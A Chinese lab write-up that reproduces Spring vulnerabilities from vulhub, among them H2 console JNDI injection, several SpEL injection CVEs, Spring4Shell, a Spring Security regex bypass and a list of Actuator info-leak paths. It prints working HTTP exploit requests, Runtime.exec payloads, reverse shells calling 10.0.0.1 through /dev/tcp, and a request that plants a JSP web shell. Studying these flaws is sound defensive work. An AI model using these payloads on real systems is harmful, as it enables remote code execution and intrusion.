
目录* [SpEL注入攻击](https://github.com)
	+ [Spring H2 Database Console未授权访问](https://github.com)
	+ [Spring Security OAuth2远程命令执行漏洞(CVE\-2016\-4977\)](https://github.com)
	+ [Spring WebFlow远程代码执行漏洞(CVE\-2017\-4971\)](https://github.com)
	+ [Spring Data Rest远程命令执行漏洞(CVE\-2017\-8046\)](https://github.com)
	+ [Spring Messaging远程命令执行漏洞(CVE\-2018\-1270\)](https://github.com)
	+ [Spring Data Commons远程命令执行漏洞(CVE\-2018\-1273\)](https://github.com)
	+ [Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE\-2022\-22947\)](https://github.com)
	+ [Spring Cloud Function SpEL表达式命令注入(CVE\-2022\-22963\)](https://github.com)
* [Spring Framework 远程命令执行漏洞(CVE\-2022\-22965\)](https://github.com)
* [Spring Security认证绕过(CVE\-2022\-22978\)](https://github.com)
* [SpringBoot信息泄露](https://github.com):[楚门加速器p](https://tianchuang88.com)


> **以下漏洞复现大部分来自[vulhub](https://github.com)**，本篇文章主要是为了熟悉和理解常见的漏洞的攻击流程，当然也有我自己的一些原理解释。


# SpEL注入攻击


## Spring H2 Database Console未授权访问


* 漏洞原理


	+ vulhub的解释
	H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：
	```
	spring.h2.console.enabled=true
	spring.h2.console.settings.web-allow-others=true
	
	```
	
	利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。
	+ 我的补充
	参考文章：[Spring Boot \+ H2数据库JNDI注入](https://github.com)
	这里就是一个JNDI注入，在web页面中输入我们的rmi服务器，即远程绑定我们的方法，然后去http服务器加载恶意class类，攻击成功。
* 影响版本
Spring Boot中使用 H2数据库。只要设置不当就会出现该漏洞
* 漏洞复现
访问路由 `/h2-console` 来到页面
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/cd68fc041ad241ba8ab81bd189617333.png)
自己搭建好rmi服务器且弄好http加载恶意类，但是我们可以直接使用大佬的集成工具，JNDI一键帮忙搭载好了：[https://github.com/welk1n/JNDI\-Injection\-Exploit](https://github.com)
开启恶意服务器：
设置好\-C执行的命令
（\-A 默认是第一张网卡地址，\-A 你的服务器地址，我这里就默认了）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/95cfcb107fd249f68a43dfb69856e19e.png)


攻击之前先进入容器查看一下确认不存在hacker文件
（因为我们执行的命令是touch /tmp/hacker）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/fb34687a425b42c4bbfe2987a74661d0.png)


按照你java版本(1\.8以上建议选第一个就行)选择rmi地址，然后在web漏洞存在的页面上输入



```
javax.naming.InitialContext
rmi://your-ip:1099/9b8j4m

```

点击连接即发起攻击![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0e076ab1255341ddb2586d72a6e387e3.png) rmi服务器有反应 ![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f5901673fc3c48a496895407d96812b4.png)


容器内可以看到就创建成功了
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e672465dc2d54a4bad0daf6cd4374981.png)


## Spring Security OAuth2远程命令执行漏洞(CVE\-2016\-4977\)


* 漏洞原理
参考：[https://blog.knownsec.com/2016/10/spring\-security\-oauth\-rce](https://github.com)
注意：参考文章中访问的url和vulhub给的不一样，我下面是按照vulhub的来。
**简单来说**：这里的SpEL注入，造成注入的原因是渲染了错误信息，由于errorSummary被装入model，然后进入函数后递归提取SpEL表达式执行。
* 影响版本
Spring Security OAuth2 2\.0\.0 \~ 2\.0\.9
Spring Security OAuth2 1\.0\.0 \~ 1\.0\.5
* 漏洞复现
访问 `/oauth/authorize?response_type=${233*1}&client_id=acme&scope=openid&redirect_uri=http://test`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4d41bc590218476fac3dc6878facf451.png)
需要登录的输入admin/admin
然后就会发现我们SpEL注入的表达式就在：`response_type=${233*1}`
那么就可以通过[脚本：https://github.com/vulhub/vulhub/blob/master/spring/CVE\-2016\-4977/poc.py](https://github.com) 来生成对应的SpEL表达式
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c8a59f96522b4e94937d3833cc2fc9cb.png)
使用脚本之前先进行编码，这里将你要执行的命令编码一下，这里使用base64，要进行一次反弹shell操作。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/29495c3e58614fa6b26d12ed6187f056.png)
然后使用poc.py脚本生成SpEL表达式，
格式为：`bash -c {echo,你生成的base64编码放这里|{base64,-d}|{bash,-i}`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/08c63262ea8c409b87497b133c4c29cf.png)
然后再服务器开启监听接受反弹shell
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/64dd0c023d974c8dbc0a564051a0054a.png)
接着就可以将poc.py的那一段payload放进参数`response_type=${payload这里}`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f0d5524f50c24711bc3f00213b6e7ba7.png)
可以看到反弹shell成功
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/747cb299812e4e0386f0e722741ec3fc.png)


## Spring WebFlow远程代码执行漏洞(CVE\-2017\-4971\)


* 漏洞原理
参考文章：[https://yaofeifly.github.io/2017/06/13/Spring\-Web\-Flow/](https://github.com)
简单来说：我们需要额外增加一个参数，且以\_开头的，作为payload来传递到后台进行解析，而根本原因是addDefaultMappings函数中对我们传递进来的parameterNames进行绑定解析，而解析的类为expressionParser，该类expressionParser的默认值可以解析SpEL表达式，所以通过控制参数造成了SpEL注入攻击。
由此可知还要有前提条件：
* MvcViewFactoryCreator类中useSpringBeanBinding默认值（false）未修改
* webflow配置文件中view\-state节点中指定了model属性，并且没有指定绑定的参数，即view\-state中没有配置binder节点
* 影响版本：2\.4\.x
* 漏洞复现
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/d817250fa1ed49e1b0a1c0b643defd9d.png)
来到登录页面
`/login`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/3f5746e564534065a41c31ae56d209ef.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/2008cb36b5654408bd3b2136691ab4c2.png)
访问：`/hotels/1` 进行预订酒店
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/eaeb66425b5b47349b6906486e7cc81b.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4b30dbfdf9da4addbf3a377d3032a826.png)
随便填写，然后提交
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7b4f14b5091c4266b40548214ad8c17e.png)
开启抓包，点击comfirm
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e847fec0b06444b9b308cd5efa9d2d36.png)![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ba26f0cd3a5d4b5e9e256cb330106283.png)
这里进行一个反弹shell功能，那么在服务器先开启nc监听
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/16b0db257735421b88e64aa9092e6bde.png)
然后填入反弹shell的payload:（记得将payload进行url编码）
\_(new java.lang.ProcessBuilder("bash","\-c","bash \-i \>\& /dev/tcp/10\.0\.0\.1/21 0\>\&1")).start()\=vulhub
进行url编码↓↓↓↓进行url编码
`_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/10.0.0.1/21+0>%261")).start()=vulhub`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/bf8a3158197745dd8fa52ebdd4672b16.png)
发送数据包，返回500是正常
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/23f12097dc7449abb406c6e86c4030f4.png)
查看nc已经看到反弹shell了
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4a94c4b7ec9c4d41a419b3ae600f0db5.png)


## Spring Data Rest远程命令执行漏洞(CVE\-2017\-8046\)


* 漏洞原理
参考文章：[https://tech.meituan.com/2017/09/29/spring\-data\-rest\-cve.html](https://github.com)
简单来说：通过提交一个PATCH请求op为replace，调用父类PatchOperation的evaluateValueFromTarget方法，但是这里存在缺陷，没有检查路径是否符合逻辑，那么就导致setValueOnTarget往后的参数值继续进行SpEL表达式解析。
* 影响版本
Spring Data REST versions \< 2\.5\.12, 2\.6\.7, 3\.0 RC3
Spring Boot version \< 2\.0\.0M4
Spring Data release trains \< Kay\-RC3
* 漏洞复现
容器开启后直接访问：`/customers/1`
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/766e08306c2d4e2891262d30c8f40f83.png)
抓包修改为：
`该SpEL表达式操作为：touch /tmp/success`，具体执行命令可以自行修改字节来控制。



```
PATCH /customers/1 HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json-patch+json
Content-Length: 202

[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115}))/lastname", "value": "vulhub" }]

```


放包前查看容器内是否存在该文件：
`docker exec -it 3b2e846b1012 ls /tmp` ![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e392b9fd80ab496cb13a387b9c0df79d.png)
放包返回400
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5dc084bc4c4c466db04a722c453efcd0.png)
返回容器查看就被创建出来了
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ba10664eaf394d37ac6735fad38cdb98.png)


## Spring Messaging远程命令执行漏洞(CVE\-2018\-1270\)


* 漏洞原理
Websocket是html5提出的一个协议规范，是为解决客户端与服务端实时通信，在建立连接之后，双方可以在任意时刻，相互推送信息。
STOMP是websocket的子协议，主要规定传输内容。但是在该漏洞中你只需要知道SUBSCRIBE为订阅消息以及注册订阅的目的地，SEND为发送消息。通过这两个命令就足够理解漏洞原理了。
一般是建立连接为subscribe，send为连接后发送的消息。



> spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用StandardEvaluationContext解析，造成命令执行漏洞。


**提取大佬的总结**：


* 通过发送SUBSRIBE消息解析表达式并**保存到消息指定的目的地址下**
* 当发送SEND消息时会从目的地址下获取所有的存根，遍历存根并获取对应的表达式并调用getValue方法触发漏洞


说白了就是先订阅，这个动作就是建立好连接了，后面都必须要使用这个连接，然后通过这个连接去触发你在订阅的时候插入的恶意payload，但是这个触发是按照真实环境来看的，也就说你需要找到建立连接后哪个可以进行send动作的路由，这个路由是开发者在开发的时候定义的，所以你需要找到后才能进行发送。
如图所示：先connect 然后去send，就通过这种方式来攻击。
（ps:本人在抓包的时候尽力建立同一个连接来进行发送，但是就是无法通过抓包形式来建立好连接，所以真的就只能使用poc脚本来攻击了）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/a6dea2fc08224c1da0e81f671ab61918.png)




---




---


* 影响版本
Spring Framework 5\.0 to 5\.0\.4
Spring Framework 4\.3 to 4\.3\.14
* 漏洞复现
虽然我的电脑无法通过抓包来复现，但是还是要过一下流程
1\.开启靶场
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ea5c41ad994241879dd544c535313b7c.png)
2\.点击网页中的connect抓包，发送payload



```
"SUBSCRIBE\nselector:T(java.lang.Runtime).getRuntime().exec('touch /tmp/success')\nid:sub-0\ndestination:/topic/greetings\n\n\u0000"

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0973cd9ab152481a8d71978f9c87963f.png)
3\.如果你的建立成功了，也就是说网页中的disconnect可以点击的话代表你已经成功连接了，然后点击send发送抓包。
（这里无须纠结为什么是app/hello，因为是demo让你复现的，真实环境的话你自己点击下出现发送send的数据包就抓下来即可，其实你点击发送就已经是攻击成了，主要是你在建立连接的时候，是否成功插入payload进去）



```
["SEND\ncontent-length:16\ndestination:/app/hello\n\n{\"name\":\"aaaaa\"}\u0000"]

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0c690db814af4db098065d2588dcc281.png)
如果你查看容器下/tmp/有success就代表攻击成功了。
由于本人这种方式没有复现成功就使用攻击脚本来复现，脚本能够帮助你一直使用这个连接然后就不用抓包放包等建立连接了。
下载脚本：[exploit.py](https://github.com)
如果你是使用vulhub靶场来复现的只需要修改56行即可（如果不是就自行找到订阅和send）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/6b2061522aeb4c8ca19742dd72deba95.png)
先查看确认靶场内不存在success文件（因为攻击命令就是创建success文件）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b2f4a3b869fc476eae1170d2bb31e43b.png)
然后直接运行py脚本，
这里我修改了一下脚本，将发送的data数据打印出来了，攻击过程更加清楚。
可以看到就是实打实的三步骤：
1\.先建立连接
2\.发送订阅，订阅消息中加入了SpEL恶意代码
3\.发送消息，触发SpEL解析
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/dde20d4a75ca49f184094ab05c7e78fb.png)
查看容器发现已经成功创建文件
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1df708c41341488da048085558f5d219.png)


## Spring Data Commons远程命令执行漏洞(CVE\-2018\-1273\)


* 漏洞原理
vulhub解释：
Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2\.0\.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。
* 理解：（看不懂建议先看下面的漏洞复现）
直接看漏洞事发地：
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1b484b2e0b604edebd316bd3e65bedc0.png)
通过查看代码可以发现对参数名（propertyName）进行了很多操作，接着用propertyName设置了expression对象
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/86a7c79cbf00453694c9adadb665bcac.png)
然后到了expression.setValue 进去后就是 spel 表达式解析了，根本原因是getPropertyPath对参数名只进行了判断，但是使用的参数名还是原来的那个，所以导致我们通过修改参数名就能够进行SpEL注入攻击。
这可以继续往下看代码会看到该函数确实是进行了一个正则匹配，但是返回去后好像确实没看到对原本的参数名进行替换，所以还是使用原来的参数名去解析了。
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/c3937c9d8f9a4552966e7ca738ed3681.png)
* 影响版本：2\.0\.5及以前版本
* 漏洞复现
访问`/users`
随便抓一个包，然后替换为：



```
POST /users?page=&size=5 HTTP/1.1
Host: localhost:8080
Connection: keep-alive
Content-Length: 124
Pragma: no-cache
Cache-Control: no-cache
Origin: http://localhost:8080
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://localhost:8080/users?page=0&size=5
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0c83c964d4b440358ee38d610d9edf46.png)


发包之前先确认一下容器内不存在/tmp/success文件，因为我们攻击的代码就行创建/tmp/success文件
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/f57bdf7a0fc54cb0aab378c2f8a1cd22.png)


然后发包，返回500
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/8757b893649248c19ebe677cbbec7893.png)
查看文件确认攻击成功
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/12516b574fe946e29b922d1ce113cb0d.png)


## Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE\-2022\-22947\)


* 漏洞原理
Spring Cloud Gateway是Spring中的一个API网关。其3\.1\.0及3\.0\.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。
这里我没有搞清楚具体发生漏洞的代码，这里知道攻击过程，反正就是能够自定义路由，然后通过refresh路由添加进去，然后你就可以使用你自定义的路由了，**具体的SpEL注入代码就是在你自定义路由的时候注入进去了，刷新就是触发路由执行SpEL，查看你的路由就是查看执行结果**。
* 影响版本：
Spring Cloud Gateway 3\.1\.0
Spring Cloud Gateway 3\.0\.6
* 漏洞复现
随便抓包修改数据包
1\.自定义路由



```
POST /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/faf9e10d0cce44b9ba9ffc329e1ab797.png)
2\.刷新添加路由且执行SpEL



```
POST /actuator/gateway/refresh HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0



```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/80f848d97d8543208f6de080da0d41fd.png)
3\.查看执行结果



```
GET /actuator/gateway/routes/hacktest HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 0



```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9e32bc222ced499fb32579b286b978a7.png)


## Spring Cloud Function SpEL表达式命令注入(CVE\-2022\-22963\)


* 漏洞原理
SpringCloud Function 中的functionRouter支持SpEL，跟进代码发现最后是StandardEvaluationContext 对header的值进行SpEL表达式解析。
根本原因就是也就是说在框架中可以直接添加header值，改成能够执行SpEL的spring.cloud.function.routing\-expression豆子，其值写入SpEL代码，代码中最终会判断spring.cloud.function.routing\-expression不为空，将其值传入functionFromExpression，最终解析了SpEL。
* 影响版本
springcloud Function3\.0以上版本
* 漏洞复现
开启容器后，先确认不存在/tmp/success文件
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/ff4c9a00a4e54daeaf195c5a75fb8cf0.png)
发送数据包



```
POST /functionRouter HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("touch /tmp/success")
Content-Type: text/plain
Content-Length: 4

test

```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/496b237c532742ca9c78abb132baf060.png)
再次查看就可以发现文件创建成功
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/0b2a04440b4148b68d7f3d2bf5c485f3.png)




---


SpEL注入相关漏洞到此结束。
下面就不是有关SpEL的一些Spring漏洞了。


# Spring Framework 远程命令执行漏洞(CVE\-2022\-22965\)


* 漏洞原理
vulhub解释：
在 JDK 9\+ 上运行的 Spring MVC 或 Spring WebFlux 应用程序可能容易受到通过数据绑定进行的远程代码执行 (RCE) 攻击。特定漏洞需要应用程序在 Tomcat 上以 WAR 部署运行。如果应用程序部署为 Spring Boot 可执行 jar（即默认），则不易受到攻击。但是，漏洞的性质更为普遍，可能还有其他方法可以利用它。
* 影响版本
Spring Framework 5\.3\.x \~ 5\.3\.18
Spring Framework 2\.x \~ 5\.2\.20
使用tomcat \< 9\.0\.62 部署spring并且使用了POJO参数绑定
* 漏洞复现
随便抓包，修改成以下数据包（记得还有两个回车）



```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
suffix: %>//
c1: Runtime
c2: <%
DNT: 1



```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/9f150ec16bd64d4abd05581948b65619.png)


然后就能直接远程使用命令了
访问：`/tomcatwar.jsp?pwd=j&cmd=id` ，cmd就是你要执行的命令
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/395f57eb0a034135876086114ef6f01e.png)


# Spring Security认证绕过(CVE\-2022\-22978\)


* 漏洞原理
看了无数篇漏洞解析，其实就是因为正则匹配中匹配不上，导致没有进行安全认证，所以导致了认证绕过。
事故发生地就是：
`httpSecurity.authorizeRequests().regexMatchers("/admin/.*","你传入的uri").authenticated();`
就是因为这里的`.*` ，因为.是不匹配\\r\\n（即%0a或者%0d），所以当你传入\\r \\n的时候就会匹配出错，导致返回false，那么就不会进行认证，那么就绕过了直接进入后台。
当然你要知道人家后台的uri，比如这里靶场就是admin，那么在绕过的时候只要前面带着admin，然后你也通过%0a或者%0d绕过，不管你admin后是啥路径都会带你进入admin后台，所以不要在意你admin后是啥路径，只要带着绕过正则匹配的%0a或者%0d即可。
* 影响版本：Spring Security5\.5\.6 \~ 5\.6\.3
* 漏洞复现
没啥好说的，找到后台uri后在后面拼接%0a或者%0d即可绕过了
未绕过前
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5c5b39d16c9d40e3aaa0bf4fee25f8c1.png)
绕过后
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/7b3c26439b5a4b5bae130caeed9010e9.png)


# SpringBoot信息泄露


* 漏洞原理
我这里就不分析了。
推荐文章：[Spring Boot 信息泄露总结](https://github.com)


下面是常见的信息泄露路由
可以通过字典进行fuzz
或者
可以使用github上的开源扫描工具：[SpringBoot\-Scan](https://github.com)



```
/api-docs
/v2/api-docs
/swagger-ui.html
/api.html
/sw/swagger-ui.html
/api/swagger-ui.html
/template/swagger-ui.html
/spring-security-rest/api/swagger-ui.html
/spring-security-oauth-resource/swagger-ui.html
/mappings
/actuator/mappings
/metrics
/actuator/metrics
/beans
/actuator/beans
/configprops
/actuator/configprops
/actuator
/auditevents
/autoconfig
/caches
/conditions
/docs
/dump
/env
/flyway
/health
/heapdump
/httptrace
/info
/intergrationgraph
/jolokia
/logfile
/loggers
/liquibase
/prometheus
/refresh
/scheduledtasks
/sessions
/shutdown
/trace
/threaddump
/actuator/auditevents
/actuator/health
/actuator/conditions
/actuator/env
/actuator/info
/actuator/loggers
/actuator/heapdump
/actuator/threaddump
/actuator/scheduledtasks
/actuator/httptrace
/actuator/jolokia
/actuator/hystrix.stream


```

比如↓（真实环境，所以厚码附上）
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/4c47bd0786e049289ba4a3ba717229fe.png)




---


(spring不止这些漏洞，只是从vulhub中的漏洞进行复现以及解析理解)
后续等本散修突破境界有能力之后会尝试开设相关漏洞源码分析。




---


